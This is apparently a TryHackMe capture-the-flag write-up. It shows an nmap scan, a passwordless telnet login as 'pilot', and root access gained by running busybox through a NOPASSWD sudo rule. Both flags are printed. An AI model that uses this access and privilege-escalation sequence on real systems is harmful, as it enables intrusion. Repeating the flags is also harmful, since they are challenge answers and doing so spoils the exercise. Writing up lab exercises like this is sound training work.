#BEBOP


```md
root@ip-10-64-70-59:~# nmap 10.64.177.188
Starting Nmap 7.80 ( https://nmap.org ) at 2025-12-12 00:24 GMT
Nmap scan report for 10.64.177.188
Host is up (0.00029s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
23/tcp open  telnet

Nmap done: 1 IP address (1 host up) scanned in 6.18 seconds
root@ip-10-64-70-59:~# 
```

Overview of Telnet Vulnerabilities

Telnet is an outdated protocol used for remote access to devices and servers. It has several significant vulnerabilities that make it insecure for modern use.
Key Vulnerabilities
```md
| Vulnerability Type              | Description                                                                                       |
|---------------------------------|---------------------------------------------------------------------------------------------------|
| Lack of Encryption              | Telnet transmits data, including passwords, in plain text, making it easy for attackers to intercept sensitive information. |
| Weak Authentication             | Many Telnet implementations lack robust authentication mechanisms, allowing unauthorized access.   |
| Susceptibility to Eavesdropping | Attackers can easily capture Telnet traffic on the network, leading to potential data breaches.   |
| Vulnerability to Malware        | Telnet allows remote command execution, which can be exploited to install malware on target systems. |
| Inadequate Logging              | Telnet often does not log sessions, making it difficult to track access and respond to incidents.  |

```
Common Attack Vectors

    - Man-in-the-Middle Attacks: Attackers can intercept and modify communications between the client and server.
    - Password Guessing: Weak passwords can be easily guessed or cracked, leading to unauthorized access.
    - Command Injection: Some Telnet implementations allow attackers to execute arbitrary commands if they gain access.

```md
root@ip-10-64-70-59:~# telnet 10.64.177.188
Trying 10.64.177.188...
Connected to 10.64.177.188.
Escape character is '^]'.
login: pilot
Last login: Fri Dec 12 00:37:00 from ip-10-64-70-59.ec2.internal
FreeBSD 11.2-STABLE (GENERIC) #0 r345837: Thu Apr  4 02:07:22 UTC 2019

Welcome to FreeBSD!

Release Notes, Errata: https://www.FreeBSD.org/releases/
Security Advisories:   https://www.FreeBSD.org/security/
FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
FreeBSD FAQ:           https://www.FreeBSD.org/faq/
Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/
FreeBSD Forums:        https://forums.FreeBSD.org/

Documents installed with the system are in the /usr/local/share/doc/freebsd/
directory, or can be installed later with:  pkg install en-freebsd-doc
For other languages, replace "en" with a language code like de or fr.

Show the version of FreeBSD installed:  freebsd-version ; uname -a
Please include that output and any error messages when posting questions.
Introduction to manual pages:  man man
FreeBSD directory layout:      man hier

Edit /etc/motd to change this login announcement.
To change an environment variable in /bin/sh use:

	$ VARIABLE="value"
	$ export VARIABLE
[pilot@freebsd ~]$ ls
user.txt
[pilot@freebsd ~]$ cat user.txt
THM{r3m0v3_b3f0r3_fl16h7}
[pilot@freebsd ~]$ 
```

Explore the current user's privileges

The `sudo -l` command is used in Unix-like operating systems to list the current user's privileges and specify which commands they are allowed to run with elevated permissions using sudo

```md
[pilot@freebsd ~]$ sudo -l
User pilot may run the following commands on freebsd:
    (root) NOPASSWD: /usr/local/bin/busybox
[pilot@freebsd ~]$ 
```
Use busybox to read the root.txt

```md
[pilot@freebsd ~]$ cd /
[pilot@freebsd /]$ ls
COPYRIGHT	entropy		libexec		proc		sys
bin		etc		media		rescue		tmp
boot		home		mnt		root		usr
dev		lib		net		sbin		var
[pilot@freebsd /]$ ls root
root.txt
[pilot@freebsd /]$ sudo busybox cat root/root.txt
THM{h16hw4y_70_7h3_d4n63r_z0n3}
[pilot@freebsd /]$ 
```


